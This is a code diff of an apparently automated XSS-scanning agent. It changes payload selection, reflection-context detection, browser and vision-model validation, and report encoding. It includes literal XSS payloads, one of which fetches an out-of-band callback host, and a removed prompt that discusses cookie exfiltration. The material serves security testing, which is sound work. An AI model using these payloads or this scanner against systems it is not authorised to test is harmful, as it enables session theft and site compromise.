+                result = await self._test_single_param_from_queue(f["url"], f["parameter"], f.get("finding",{}), payload_type)
+                # v3.2: XSSFinding is a dataclass - use attribute access, not .get()
+                if result and result.validated:
                     validated.append(result)
-                    fp = self._generate_xss_fingerprint(f["url"], f["parameter"], result.get("context","html"))
+                    fp = self._generate_xss_fingerprint(f["url"], f["parameter"], result.context or "html")
                     if fp not in self._emitted_findings:
                         self._emitted_findings.add(fp)
                         if self.event_bus and settings.WORKER_POOL_EMIT_EVENTS:
                             await self.event_bus.emit(EventType.VULNERABILITY_DETECTED, {
                                 "specialist": "xss",
-                                "finding": {"type": "XSS", "url": result.get("url"), "parameter": result.get("parameter"), "payload": result.get("payload"), "context": result.get("context")},
-                                "status": result.get("status", ValidationStatus.VALIDATED_CONFIRMED.value),
-                                "validation_requires_cdp": result.get("status") == ValidationStatus.PENDING_VALIDATION.value,
+                                "finding": {"type": "XSS", "url": result.url, "parameter": result.parameter, "payload": result.payload, "context": result.context},
+                                "status": result.status or ValidationStatus.VALIDATED_CONFIRMED.value,
+                                "validation_requires_cdp": result.status == ValidationStatus.PENDING_VALIDATION.value,
                                 "scan_context": self._scan_context,
                             })
-                        logger.info(f"[{self.name}] ✅ Emitted unique XSS: {f['url']}?{f['parameter']} (context: {result.get('context','html')})")
+                        logger.info(f"[{self.name}] ✅ Emitted unique XSS: {f['url']}?{f['parameter']} (context: {result.context or 'html'})")
             except Exception as e:
                 logger.error(f"[{self.name}] Phase B [{idx}/{len(self._dry_findings)}]: {e}")
         logger.info(f"[{self.name}] Phase B complete: {len(validated)} validated")
@@ -1021,9 +1866,18 @@ class XSSAgent(BaseAgent):
         import json, aiofiles
         from datetime import datetime
         from bugtrace.core.config import settings
-        scan_dir = settings.BASE_DIR / "reports" / self._scan_context.split("/")[-1]
-        (scan_dir / "specialists").mkdir(parents=True, exist_ok=True)
-        report_path = scan_dir / "specialists" / "xss_report.json"
+        from bugtrace.core.payload_format import encode_finding_payloads
+
+        # v3.2: Write to specialists/results/ for unified wet→dry→results flow
+        scan_dir = getattr(self, 'report_dir', None) or (settings.BASE_DIR / "reports" / self._scan_context.split("/")[-1])
+        results_dir = scan_dir / "specialists" / "results"
+        results_dir.mkdir(parents=True, exist_ok=True)
+        report_path = results_dir / "xss_results.json"
+
+        # v3.2: Base64 encode payloads to prevent JSON escaping issues
+        # Complex payloads with <, >, ", ' break JSON without encoding
+        encoded_findings = [encode_finding_payloads(f) for f in findings]
+
         async with aiofiles.open(report_path, 'w') as f:
             await f.write(json.dumps({
                 "agent": self.name,
@@ -1031,24 +1885,95 @@ class XSSAgent(BaseAgent):
                 "scan_context": self._scan_context,
                 "phase_a": {"wet_count": len(self._dry_findings), "dry_count": len(self._dry_findings), "dedup_method": "llm_context_aware"},
                 "phase_b": {"validated_count": len([x for x in findings if x.get("validated")]), "total_findings": len(findings)},
-                "findings": findings
+                "findings": encoded_findings,
+                "_encoding_note": "payload fields with special chars are base64 encoded as payload_b64"
             }, indent=2))
         logger.info(f"[{self.name}] Report saved: {report_path}")
         return str(report_path)
 
     async def start_queue_consumer(self, scan_context: str) -> None:
         """TWO-PHASE queue consumer (WET → DRY). Context-aware dedup. NO infinite loop."""
+        from bugtrace.agents.specialist_utils import (
+            report_specialist_start,
+            report_specialist_progress,
+            report_specialist_done,
+            report_specialist_wet_dry,
+        )
+
         self._queue_mode = True
         self._scan_context = scan_context
         logger.info(f"[{self.name}] Starting TWO-PHASE queue consumer (WET → DRY)")
+
+        # v3.2: Load context-aware tech stack for intelligent deduplication
+        await self._load_xss_tech_context()
+
+        # Get initial queue depth for telemetry
+        queue = queue_manager.get_queue("xss")
+        initial_depth = queue.depth()
+        report_specialist_start(self.name, queue_depth=initial_depth)
+
         dry_list = await self.analyze_and_dedup_queue()
+
+        # Report WET→DRY metrics for integrity verification
+        report_specialist_wet_dry(self.name, initial_depth, len(dry_list) if dry_list else 0)
+
         if not dry_list:
             logger.info(f"[{self.name}] No findings to exploit after deduplication")
+            report_specialist_done(self.name, processed=0, vulns=0)
             return
+
         results = await self.exploit_dry_list()
+
+        # Count confirmed vulnerabilities
+        vulns_count = len([r for r in results if r]) if results else 0
+        vulns_count += len(self._dry_findings) if hasattr(self, '_dry_findings') else 0
+
         if results or self._dry_findings:
-            await self._generate_specialist_report(results)
+            # v3.2: Convert XSSFinding dataclasses to dicts for JSON serialization
+            findings_as_dicts = [asdict(r) for r in results if r] if results else []
+            await self._generate_specialist_report(findings_as_dicts)
+
+        # Report completion with final stats
+        report_specialist_done(
+            self.name,
+            processed=len(dry_list),
+            vulns=vulns_count
+        )
         logger.info(f"[{self.name}] Queue consumer complete: {len(results)} validated findings")
+
+    async def _load_xss_tech_context(self) -> None:
+        """
+        Load technology stack context from recon data (v3.2).
+
+        Uses TechContextMixin to:
+        1. Load tech_profile.json from report directory
+        2. Normalize into server/lang/framework context
+        3. Generate XSS-specific prime directive for LLM prompts
+
+        This context helps focus XSS payloads on the detected frontend/backend stack.
+        """
+        # Resolve report directory
+        scan_dir = getattr(self, 'report_dir', None)
+        if not scan_dir:
+            # Fallback: construct from scan_context
+            scan_id = self._scan_context.split("/")[-1] if self._scan_context else ""
+            scan_dir = settings.BASE_DIR / "reports" / scan_id if scan_id else None
+
+        if not scan_dir or not Path(scan_dir).exists():
+            logger.debug(f"[{self.name}] No report directory found, using generic tech context")
+            self._tech_stack_context = {"db": "generic", "server": "generic", "lang": "generic"}
+            self._xss_prime_directive = ""
+            return
+
+        # Use TechContextMixin methods
+        self._tech_stack_context = self.load_tech_stack(Path(scan_dir))
+        self._xss_prime_directive = self.generate_xss_context_prompt(self._tech_stack_context)
+
+        lang = self._tech_stack_context.get("lang", "generic")
+        server = self._tech_stack_context.get("server", "generic")
+        waf = self._tech_stack_context.get("waf")
+
+        logger.info(f"[{self.name}] XSS tech context loaded: lang={lang}, server={server}, waf={waf or 'none'}")
 
     async def stop_queue_consumer(self) -> None:
         """Stop queue consumer mode gracefully."""
@@ -1105,14 +2030,14 @@ class XSSAgent(BaseAgent):
         return result
 
     async def _test_single_param_from_queue(
-        self, url: str, param: str, finding: dict
+        self, url: str, param: str, finding: dict, payload_type: str = None
     ) -> Optional[XSSFinding]:
         """
         Test a single parameter from queue for XSS.
 
         Uses existing validation pipeline but optimized for queue processing:
         1. Check reflection context from finding
-        2. Select appropriate payloads for context
+        2. Select appropriate payloads for context (or payload_type if provided)
         3. Test with HTTP-first validation (Phase 15)
         4. Fall back to Playwright/CDP only if needed
 
@@ -1120,6 +2045,7 @@ class XSSAgent(BaseAgent):
             url: Target URL
             param: Parameter to test
             finding: Finding data from queue
+            payload_type: Optional payload type from LLM dedup (template, event_handler, etc.)
 
         Returns:
             XSSFinding if confirmed, None otherwise
@@ -1127,6 +2053,11 @@ class XSSAgent(BaseAgent):
         try:
             # Get context from finding if available
             context = finding.get("context", "unknown")
+
+            # v3.2: If payload_type is 'template' (AngularJS/Vue), override context
+            if payload_type == "template":
+                context = "template"
+                logger.info(f"[{self.name}] Using template payloads for framework injection (Angular/Vue)")
 
             # v2.1.0: Load full payload from JSON if truncated in event
             suggested_payload = load_full_payload_from_json(finding)
@@ -1141,20 +2072,25 @@ class XSSAgent(BaseAgent):
 
             interactsh_url = self.interactsh.get_url() if self.interactsh else ""
 
-            # Build payload list - prioritize suggested payload
-            payloads = []
-            if suggested_payload:
-                payloads.append(suggested_payload)
+            # Build payload list - CURATED FIRST (agnostic, fast)
+            # v3.2: Curated payloads FIRST (833 proven payloads, technology-agnostic)
+            # This is faster than LLM context manipulation and covers most cases
+            curated = self.payload_learner.get_prioritized_payloads([])[:20]
+            curated = [p.replace("{{interactsh_url}}", interactsh_url) for p in curated]
 
-            # Add context-specific payloads
+            payloads = list(curated)  # Start with curated
+
+            # Then suggested payload from finding (if not already in curated)
+            if suggested_payload and suggested_payload not in payloads:
+                payloads.insert(0, suggested_payload)  # Prioritize suggested
+
+            # Add context-specific payloads as fallback
             context_payloads = self.get_payloads_for_context(context, interactsh_url)
-            payloads.extend(context_payloads[:5])  # Limit to avoid excessive testing
+            for p in context_payloads[:5]:
+                if p not in payloads:
+                    payloads.append(p)
 
-            # Add golden payloads
-            golden = [p.replace("{{interactsh_url}}", interactsh_url) for p in self.GOLDEN_PAYLOADS[:3]]
-            payloads.extend(golden)
-
-            # Dedupe payloads
+            # Dedupe payloads (already mostly deduped, but ensure)
             seen = set()
             unique_payloads = []
             for p in payloads:
@@ -1162,8 +2098,8 @@ class XSSAgent(BaseAgent):
                     seen.add(p)
                     unique_payloads.append(p)
 
-            # Test each payload
-            for payload in unique_payloads[:10]:  # Max 10 payloads per queue item
+            # Test each payload - increased limit for curated coverage
+            for payload in unique_payloads[:25]:  # Max 25 payloads (was 10)
                 result = await self._test_payload_from_queue(url, param, payload, context)
                 if result:
                     return result
@@ -1256,6 +2192,41 @@ class XSSAgent(BaseAgent):
                 except Exception as e:
                     logger.debug(f"[{self.name}] Interactsh poll failed: {e}")
 
+            # v3.2: CANDIDATE fallback - if payload reflects but couldn't be confirmed
+            # This prevents losing findings that automated tools can't validate
+            # but a human pentester should review
+            if payload in response_html:
+                # Check if it's in a potentially dangerous context
+                dangerous_contexts = [
+                    '<script', 'javascript:', 'on', '{{', '${',
+                    'href=', 'src=', 'action='
+                ]
+                in_dangerous_context = any(
+                    ctx in response_html.lower() and payload.lower() in response_html.lower()
+                    for ctx in dangerous_contexts
+                )
+
+                if in_dangerous_context:
+                    logger.info(
+                        f"[{self.name}] Payload reflects in potentially dangerous context "
+                        f"but couldn't be auto-confirmed. Marking as CANDIDATE."
+                    )
+                    return XSSFinding(
+                        url=url,
+                        parameter=param,
+                        payload=payload,
+                        context=context,
+                        validation_method="reflection_analysis",
+                        evidence={
+                            "reflected": True,
+                            "auto_confirmed": False,
+                            "reason": "Payload reflects in dangerous context but execution not confirmed"
+                        },
+                        confidence=0.6,
+                        status="CANDIDATE",
+                        validated=False
+                    )
+
             return None
 
         except Exception as e:
@@ -1266,9 +2237,9 @@ class XSSAgent(BaseAgent):
         self, url: str, param: str, payload: str
     ) -> Optional[Dict[str, Any]]:
         """
-        Validate XSS using browser (Playwright).
+        Validate XSS using browser with intelligent escalation.
 
-        Used for DOM-based XSS and event handlers that need JS execution.
+        Flow: Playwright (L3) → CDP (L4) → DOM XSS detector
 
         Args:
             url: Target URL
@@ -1287,15 +2258,34 @@ class XSSAgent(BaseAgent):
             new_query = urlencode(query_params, doseq=True)
             test_url = urlunparse(parsed._replace(query=new_query))
 
-            # Use existing visual verifier
-            result = await self.verifier.verify(test_url, payload)
-            if result and result.get("confirmed"):
-                return result
+            # v3.2: Use verify_xss with max_level=4 for Playwright → CDP escalation
+            result = await self.verifier.verify_xss(
+                url=test_url,
+                timeout=15.0,
+                max_level=4  # L3=Playwright, L4=CDP fallback
+            )
 
-            # Also check for DOM marker
-            dom_result = await detect_dom_xss(test_url)
-            if dom_result and dom_result.get("confirmed"):
-                return dom_result
+            if result and result.success:
+                return {
+                    "confirmed": True,
+                    "method": result.method,
+                    "evidence": getattr(result, 'evidence', {}),
+                    "screenshot": getattr(result, 'screenshot_path', None)
+                }
+
+            # Also check for DOM XSS patterns
+            dom_results = await detect_dom_xss(test_url)
+            if dom_results:
+                # detect_dom_xss returns a list of findings
+                for dom_finding in dom_results:
+                    if dom_finding.get("validated"):
+                        return {
+                            "confirmed": True,
+                            "method": "dom_xss_detector",
+                            "sink": dom_finding.get("sink"),
+                            "source": dom_finding.get("source"),
+                            "evidence": dom_finding.get("evidence")
+                        }
 
             return None
 
@@ -1335,7 +2325,8 @@ class XSSAgent(BaseAgent):
         Handle completed queue item processing.
 
         Emits vulnerability_detected event on confirmed findings.
-        Uses centralized validation status to determine if CDP validation is needed.
+        v3.2: Respects the status already set by _test_payload_from_queue
+        (VALIDATED_CONFIRMED, CANDIDATE) instead of re-calculating.
         """
         if result is None:
             return
@@ -1343,16 +2334,14 @@ class XSSAgent(BaseAgent):
         # Add to findings list
         self.findings.append(result)
 
-        # Use centralized validation status for proper tagging
-        finding_data = {
-            "context": result.context,
-            "payload": result.payload,
-            "validation_method": result.validation_method,
-            "reflection_context": result.reflection_context,
-            "evidence": result.evidence,
-        }
-        validation_status = get_validation_status(finding_data, result.confidence)
-        needs_cdp = requires_cdp_validation(finding_data)
+        # v3.2: Use the status already set by _test_payload_from_queue
+        # The XSSAgent already did HTTP → Playwright → CDP validation,
+        # so don't re-calculate and potentially send to CDP again
+        validation_status = result.status
+        # Only mark as needs_cdp if explicitly PENDING_VALIDATION (legacy code)
+        # New flow uses VALIDATED_CONFIRMED or CANDIDATE, never PENDING_VALIDATION
+        needs_cdp = (result.status == "PENDING_VALIDATION" or
+                     result.status == ValidationStatus.PENDING_VALIDATION.value)
 
         # EXPERT DEDUPLICATION: Check if we already emitted this finding
         fingerprint = self._generate_xss_fingerprint(result.url, result.parameter, result.context)
@@ -1377,7 +2366,8 @@ class XSSAgent(BaseAgent):
                     "confidence": result.confidence,
                     "validation_method": result.validation_method,
                 },
-                "status": validation_status.value,
+                # v3.2: validation_status is already a string from XSSFinding.status
+                "status": validation_status if isinstance(validation_status, str) else validation_status.value,
                 "validation_requires_cdp": needs_cdp,
                 "scan_context": self._scan_context,
             })
@@ -1430,8 +2420,13 @@ class XSSAgent(BaseAgent):
             logger.info(f"[{self.name}] Returning {validated_count} findings.")
             dashboard.log(f"[{self.name}] ✅ Scan complete. {validated_count} XSS found.", "SUCCESS")
 
+            # v3.2: Base64 encode payloads to prevent JSON escaping issues
+            from bugtrace.core.payload_format import encode_finding_payloads
+            findings_dicts = [self._finding_to_dict(f) for f in self.findings]
+            encoded_findings = [encode_finding_payloads(fd) for fd in findings_dicts]
+
             return {
-                "findings": [self._finding_to_dict(f) for f in self.findings],
+                "findings": encoded_findings,
                 "validated_count": validated_count,
                 "params_tested": len(self.params)
             }
@@ -2961,15 +3956,33 @@ Response Format (XML-Like):
             if not response_html:
                 return False
 
-        # Tier 1.2: Regex-based Context Analysis
-        context = self._detect_execution_context(payload, response_html)
-        if context in ["script_block", "event_handler", "javascript_uri", "template_expression"]:
+        # Tier 1.2: Accurate Context Analysis (checks for escaping)
+        # Uses new methods that verify payload is NOT neutered/escaped
+        if self._is_executable_in_html_context(payload, response_html):
             evidence["http_confirmed"] = True
-            evidence["execution_context"] = context
+            evidence["execution_context"] = "html_tag"
             evidence["method"] = "L1: HTTP Static Reflection"
             evidence["level"] = 1
             evidence["status"] = "VALIDATED_CONFIRMED"
             return True
+
+        if self._is_executable_in_event_handler(payload, response_html):
+            evidence["http_confirmed"] = True
+            evidence["execution_context"] = "event_handler"
+            evidence["method"] = "L1: HTTP Static Reflection"
+            evidence["level"] = 1
+            evidence["status"] = "VALIDATED_CONFIRMED"
+            return True
+
+        if self._is_executable_in_javascript_uri(payload, response_html):
+            evidence["http_confirmed"] = True
+            evidence["execution_context"] = "javascript_uri"
+            evidence["method"] = "L1: HTTP Static Reflection"
+            evidence["level"] = 1
+            evidence["status"] = "VALIDATED_CONFIRMED"
+            return True
+
+        # Note: Template expressions require browser evaluation, not confirmed here
 
         return False
 
@@ -3055,76 +4068,56 @@ Response Format (XML-Like):
     async def _run_vision_validation(
         self, screenshot_path: str, attack_url: str, payload: str, evidence: Dict
     ) -> Optional[bool]:
-        """Run Vision AI validation and return success status or None."""
-        dashboard.log(f"[{self.name}] 📸 Calling Vision AI for impact validation...", "INFO")
+        """
+        Run Vision AI validation - simple SI/NO confirmation.
+
+        Playwright already detected XSS via DOM/dialog. Vision provides
+        VISUAL CONFIRMATION that the banner is visible = double evidence.
+        """
+        dashboard.log(f"[{self.name}] 📸 Calling Vision AI for visual confirmation...", "INFO")
 
         try:
-            from bugtrace.core.llm_client import get_vision_model
-            vision_client = get_vision_model()
+            from bugtrace.core.llm_client import llm_client
 
-            vision_prompt = self._build_vision_prompt(attack_url, payload)
-            vision_result = await self._call_vision_with_retry(vision_client, screenshot_path, vision_prompt)
+            vision_prompt = self._build_vision_prompt()
+            vision_response = await self._call_vision_with_retry(
+                llm_client, screenshot_path, vision_prompt
+            )
 
-            return self._process_vision_result(vision_result, evidence)
+            return self._process_vision_result(vision_response, evidence)
 
         except Exception as e:
             logger.error(f"[{self.name}] Vision AI validation failed: {e}", exc_info=True)
             evidence["vision_error"] = str(e)
+            # Playwright already confirmed, Vision is bonus - don't fail the finding
             return None
 
-    def _build_vision_prompt(self, attack_url: str, payload: str) -> str:
-        """Build vision AI prompt for XSS validation."""
-        return f"""Analyze this screenshot for XSS execution WITH REAL IMPACT.
+    def _build_vision_prompt(self) -> str:
+        """
+        Build simple SI/NO vision prompt.
 
-URL: {attack_url}
-Payload: {payload}
+        We only need to confirm the visual marker is visible.
+        Playwright already validated execution context.
+        """
+        return """Look at this screenshot of a web page.
 
-CRITICAL: Do NOT confirm low-impact XSS like alert(1) which can be sandboxed.
+Question: Do you see a red banner or text that says "HACKED BY BUGTRACEAI" anywhere in the image?
 
-Look for HIGH-IMPACT evidence:
-1. **Tier 1 (CRITICAL - Auto-confirm)**:
-   - Cookie/token exfiltration (document.cookie, fetch to external server)
-   - Session hijacking demonstration
-   - Account takeover POC
+Answer with ONLY one word: SI or NO"""
 
-2. **Tier 2 (HIGH - Confirm if clear)**:
-   - document.domain access (proves main context execution)
-   - localStorage/sessionStorage access
-   - DOM manipulation affecting user actions (form hijacking, etc.)
-
-3. **Tier 3 (MEDIUM - REJECT)**:
-   - Simple alert(1) - likely sandboxed, NO IMPACT
-   - console.log() - NO IMPACT
-   - Reflection in isolated context (iframe sandbox) - NO IMPACT
-
-Look for visual evidence:
-- Alert/dialog showing sensitive data (cookies, domain, storage)
-- Network tab showing outbound requests to attacker server
-- Console logs revealing document.cookie or document.domain
-- DOM changes that affect functionality (not just cosmetic)
-
-Return JSON:
-{{
-    "success": true/false,
-    "impact_tier": "CRITICAL" | "HIGH" | "MEDIUM" | "LOW",
-    "confidence": 0.0-1.0,
-    "evidence": "what you see that proves impact",
-    "impact_type": "cookie_exfiltration" | "domain_access" | "storage_access" | "alert_only" | "no_execution",
-    "reason": "why it is/isn't a real XSS with impact",
-    "sandbox_detected": true/false
-}}
-"""
-
-    async def _call_vision_with_retry(self, vision_client, screenshot_path: str, prompt: str) -> Dict:
-        """Call vision API with retry logic."""
+    async def _call_vision_with_retry(self, llm_client, screenshot_path: str, prompt: str) -> str:
+        """Call vision API with retry logic using llm_client.generate_with_image()."""
         max_retries = 3
+
         for attempt in range(max_retries):
             try:
-                result = await vision_client.analyze_image(
+                result = await llm_client.generate_with_image(
+                    prompt=prompt,
                     image_path=screenshot_path,
-                    prompt=prompt
+                    module_name="XSS-Vision",
+                    temperature=0.1  # Low temperature for deterministic SI/NO
                 )
-                return result
+                return result or ""
             except Exception as retry_error:
                 if attempt == max_retries - 1:
                     raise
@@ -3133,46 +4126,54 @@ Return JSON:
 
         raise Exception("Vision validation failed after all retries")
 
-    def _process_vision_result(self, vision_result: Dict, evidence: Dict) -> Optional[bool]:
-        """Process vision AI result and update evidence."""
-        impact_tier = vision_result.get("impact_tier", "LOW")
-        confidence = vision_result.get("confidence", 0)
-        sandbox_detected = vision_result.get("sandbox_detected", False)
+    def _process_vision_result(self, vision_response: str, evidence: Dict) -> Optional[bool]:
+        """
+        Process vision AI response - simple SI/NO parsing.
 
-        # High impact confirmed
-        if impact_tier in ["CRITICAL", "HIGH"] and confidence > 0.7 and not sandbox_detected:
+        Returns:
+            True: Vision confirmed banner visible
+            False: Vision says NO banner
+            None: Inconclusive response
+        """
+        if not vision_response:
+            evidence["vision_confirmed"] = False
+            evidence["vision_reason"] = "Empty response"
+            return None
+
+        response_upper = vision_response.strip().upper()
+
+        # Check for SI/YES confirmation
+        if response_upper in ["SI", "SÍ", "YES", "S", "Y"]:
             evidence["vision_confirmed"] = True
-            evidence["vision_confidence"] = confidence
-            evidence["vision_evidence"] = vision_result.get("evidence")
-            evidence["impact_tier"] = impact_tier
-            evidence["impact_type"] = vision_result.get("impact_type")
+            evidence["vision_response"] = vision_response
+            evidence["validation_method"] = "playwright+vision"
 
             dashboard.log(
-                f"[{self.name}] ✅ VALIDATED via Vision AI ({impact_tier} impact, conf={confidence:.2f})",
+                f"[{self.name}] ✅ VISION CONFIRMED: Banner 'HACKED BY BUGTRACEAI' visible",
                 "SUCCESS"
             )
             return True
 
-        # Low impact - reject
-        if impact_tier == "MEDIUM":
+        # Check for NO confirmation
+        if response_upper in ["NO", "N"]:
             evidence["vision_confirmed"] = False
-            evidence["vision_reason"] = "Low impact (likely sandboxed alert)"
-            evidence["impact_tier"] = "MEDIUM"
-            evidence["rejected_reason"] = "No demonstrable impact (alert without data access)"
+            evidence["vision_response"] = vision_response
+            evidence["vision_reason"] = "Banner not visible in screenshot"
 
             dashboard.log(
-                f"[{self.name}] ❌ REJECTED: Low impact XSS (alert only, no data exfiltration)",
+                f"[{self.name}] ⚠️ Vision: Banner NOT visible (Playwright still confirmed)",
                 "WARNING"
             )
-            return False
+            # Return None, not False - Playwright already confirmed, don't reject
+            return None
 
-        # Inconclusive - send to validator
+        # Inconclusive - unexpected response
         evidence["vision_confirmed"] = False
-        evidence["vision_reason"] = vision_result.get("reason", "Low confidence or tier")
-        evidence["impact_tier"] = impact_tier
+        evidence["vision_response"] = vision_response
+        evidence["vision_reason"] = f"Unexpected response: {vision_response[:50]}"
 
         dashboard.log(
-            f"[{self.name}] ⚠️ Vision inconclusive ({impact_tier}), flagging for AgenticValidator",
+            f"[{self.name}] ⚠️ Vision inconclusive: {vision_response[:30]}...",
             "WARNING"
         )
         return None
@@ -3202,6 +4203,168 @@ Return JSON:
 
         return False
 
+    def _can_confirm_from_http_response(
+        self, payload: str, response_html: str, evidence: dict
+    ) -> bool:
+        """
+        Confirm XSS from HTTP response without browser.
+
+        STRICT validation: Only confirms when payload lands in a truly
+        executable context WITHOUT being neutered (escaped/encoded).
+
+        Key insight:
+        - In HTML: <, >, " must NOT be HTML-encoded (&lt; &gt; &quot;)
+        - In JS strings: quotes must NOT be backslash-escaped (\\" or \\')
+        - Payload inside a JS string literal does NOT execute
+
+        Args:
+            payload: The XSS payload that was sent
+            response_html: The HTML response to analyze
+            evidence: Dict to populate with validation details
+
+        Returns:
+            True if XSS can be confirmed from HTTP response, False otherwise
+        """
+        # Strategy: Check each potential execution context and verify
+        # the payload is NOT neutered in that specific context
+
+        # 1. Check for unescaped payload in HTML tag context
+        if self._is_executable_in_html_context(payload, response_html):
+            evidence["http_confirmed"] = True
+            evidence["execution_context"] = "html_tag"
+            evidence["validation_method"] = "http_response_analysis"
+            return True
+
+        # 2. Check for unescaped payload in event handler
+        if self._is_executable_in_event_handler(payload, response_html):
+            evidence["http_confirmed"] = True
+            evidence["execution_context"] = "event_handler"
+            evidence["validation_method"] = "http_response_analysis"
+            return True
+
+        # 3. Check for javascript: URI execution
+        if self._is_executable_in_javascript_uri(payload, response_html):
+            evidence["http_confirmed"] = True
+            evidence["execution_context"] = "javascript_uri"
+            evidence["validation_method"] = "http_response_analysis"
+            return True
+
+        # 4. Check for template expression execution
+        if self._is_executable_in_template(payload, response_html):
+            evidence["http_confirmed"] = True
+            evidence["execution_context"] = "template_expression"
+            evidence["validation_method"] = "http_response_analysis"
+            return True
+
+        # No executable context found
+        evidence["http_confirmed"] = False
+        return False
+
+    def _is_executable_in_html_context(self, payload: str, response_html: str) -> bool:
+        """
+        Check if payload creates a new HTML tag that could execute JS.
+
+        Returns True only if:
+        - Payload contains < and > (to create a tag)
+        - These chars appear RAW (not as &lt; &gt;) in the response
+        - The context is outside of script tags
+        """
+        # Must have tag-creating chars
+        if '<' not in payload or '>' not in payload:
+            return False
+
+        # Check for raw payload outside of <script> blocks
+        # Remove script blocks from consideration
+        import re
+        html_without_scripts = re.sub(r'<script[^>]*>.*?</script>', '', response_html, flags=re.DOTALL | re.IGNORECASE)
+
+        # Check if raw payload appears in the cleaned HTML
+        if payload not in html_without_scripts:
+            return False
+
+        # Verify < and > are NOT escaped at the payload location
+        # Find where payload appears and check surrounding context
+        pos = html_without_scripts.find(payload)
+        if pos == -1:
+            return False
+
+        # Check that we're not inside a JS string or HTML attribute value
+        # where the payload would be data, not code
+        # Look for the < char from our payload - it should NOT be preceded by &
+        payload_start = pos
+        check_start = max(0, payload_start - 10)
+        before_context = html_without_scripts[check_start:payload_start]
+
+        # If we see HTML encoding markers right before, it's escaped
+        if '&lt;' in before_context or '&quot;' in before_context:
+            return False
+
+        # Payload appears raw in HTML - likely executable
+        return True
+
+    def _is_executable_in_event_handler(self, payload: str, response_html: str) -> bool:
+        """
+        Check if payload can execute via event handler attribute.
+
+        Event handlers like onclick="PAYLOAD" execute JS.
+        But if payload's quotes are HTML-encoded, it won't break out.
+        """
+        import re
+
+        # Look for payload in event handler context
+        # Pattern: on[event]="...[payload]..."
+        event_pattern = rf'on\w+\s*=\s*(["\'])([^"\']*?){re.escape(payload)}'
+        match = re.search(event_pattern, response_html, re.IGNORECASE)
+
+        if not match:
+            return False
+
+        # Check if payload breaks out of the attribute
+        # If payload contains the same quote type, it must NOT be escaped
+        quote_char = match.group(1)  # The quote used: " or '
+
+        if quote_char in payload:
+            # Check if quote in payload is HTML-encoded
+            encoded_quote = '&quot;' if quote_char == '"' else '&#39;'
+            payload_with_encoded = payload.replace(quote_char, encoded_quote)
+
+            # If the encoded version is what's in the response, payload is neutered
+            if payload_with_encoded in response_html:
+                return False
+
+        # Payload in event handler without proper encoding - executable
+        return True
+
+    def _is_executable_in_javascript_uri(self, payload: str, response_html: str) -> bool:
+        """
+        Check if payload can execute via javascript: URI.
+
+        href="javascript:PAYLOAD" executes when clicked.
+        """
+        import re
+
+        # Pattern: href/src/action="javascript:...[payload]..."
+        if payload.lower().startswith('javascript:'):
+            # Payload is the full javascript: URI
+            pattern = rf'(href|src|action)\s*=\s*["\']?{re.escape(payload)}'
+        else:
+            # Payload is the code part
+            pattern = rf'(href|src|action)\s*=\s*["\']?javascript:[^"\']*{re.escape(payload)}'
+
+        return bool(re.search(pattern, response_html, re.IGNORECASE))
+
+    def _is_executable_in_template(self, payload: str, response_html: str) -> bool:
+        """
+        Check if payload appears in template expression.
+
+        {{payload}} or ${payload} in Angular/Vue/etc could execute.
+        BUT: This requires browser to evaluate, so return False here
+        and let browser validation handle it.
+        """
+        # Template expressions need client-side evaluation
+        # We can't confirm execution from HTTP alone
+        return False
+
     def _detect_execution_context(self, payload: str, response_html: str) -> Optional[str]:
         """
         Detect the execution context where payload landed.
@@ -3220,8 +4383,17 @@ Return JSON:
             return "event_handler"
 
         # 3. javascript: URI scheme (href, src, action attributes)
-        if re.search(rf'(href|src|action)\s*=\s*["\']?javascript:[^"\']*{escaped}', response_html, re.IGNORECASE):
-            return "javascript_uri"
+        # Handle both cases:
+        # a) Payload without javascript: prefix in href="javascript:PAYLOAD"
+        # b) Payload with javascript: prefix in href="javascript:alert(1)"
+        if payload.lower().startswith('javascript:'):
+            # Payload already has javascript: - look for it directly in href/src/action
+            if re.search(rf'(href|src|action)\s*=\s*["\']?{escaped}', response_html, re.IGNORECASE):
+                return "javascript_uri"
+        else:
+            # Payload without javascript: - look for it inside javascript: URI
+            if re.search(rf'(href|src|action)\s*=\s*["\']?javascript:[^"\']*{escaped}', response_html, re.IGNORECASE):
+                return "javascript_uri"
 
         # 4. Template expressions (Angular/Vue/etc.)
         if re.search(rf'\{{\{{[^}}]*{escaped}[^}}]*\}}\}}', response_html) or re.search(rf'\$\{{[^}}]*{escaped}[^}}]*\}}', response_html):
@@ -3265,6 +4437,24 @@ Return JSON:
         for pattern in complex_sinks:
             if re.search(pattern, response_html):
                 return True
+
+        # 4. Template syntax in payload (CSTI - Angular, Vue, etc.)
+        # These require browser to evaluate if JS framework processes them
+        template_patterns = [
+            r'\{\{',      # Angular/Vue mustache syntax
+            r'\$\{',      # JS template literals
+            r'#\{',       # Ruby ERB / Pug
+            r'\{%',       # Jinja2/Twig
+            r'<%',        # EJS/ASP
+        ]
+        for pattern in template_patterns:
+            if re.search(pattern, payload):
+                return True
+
+        # 5. Check if response has Angular/Vue and payload reflected
+        if re.search(r'angular|ng-app|vue\.js|v-bind|v-model', response_html, re.IGNORECASE):
+            # Framework detected - any reflection needs browser validation
+            return True
 
         return False
 
@@ -3451,18 +4641,8 @@ Return JSON:
         return prioritized
 
     # =========================================================================
-    # ADDITIONAL ATTACK VECTORS: POST, Headers, Cookies
+    # ADDITIONAL ATTACK VECTORS: POST, Cookies
     # =========================================================================
-
-    # Headers commonly vulnerable to XSS reflection
-    INJECTABLE_HEADERS = [
-        "Referer",
-        "X-Forwarded-For",
-        "X-Forwarded-Host",
-        "User-Agent",
-        "X-Requested-With",
-        "Accept-Language",
-    ]
 
     async def _post_send_request(
         self,
@@ -3552,121 +4732,6 @@ Return JSON:
                     return self._post_build_finding(form_action, param, payload, evidence)
 
         return None
-
-    async def _test_header_injection(
-        self,
-        interactsh_url: str,
-        screenshots_dir: Path
-    ) -> Optional[XSSFinding]:
-        """Test HTTP headers for XSS reflection."""
-        dashboard.log(f"[{self.name}] 🔧 Testing header injection vectors...", "INFO")
-
-        test_payloads = self._get_header_test_payloads(interactsh_url)
-
-        for header_name in self.INJECTABLE_HEADERS:
-            if self._max_impact_achieved:
-                break
-
-            finding = await self._test_single_header(header_name, test_payloads)
-            if finding:
-                return finding
-
-        return None
-
-    def _get_header_test_payloads(self, interactsh_url: str) -> List[str]:
-        """Get test payloads for header injection."""
-        return [
-            f"<script>fetch('{interactsh_url}')</script>",
-            "<img src=x onerror=alert(document.domain)>",
-            "javascript:alert(document.cookie)",
-        ]
-
-    async def _test_single_header(self, header_name: str, payloads: List[str]) -> Optional[XSSFinding]:
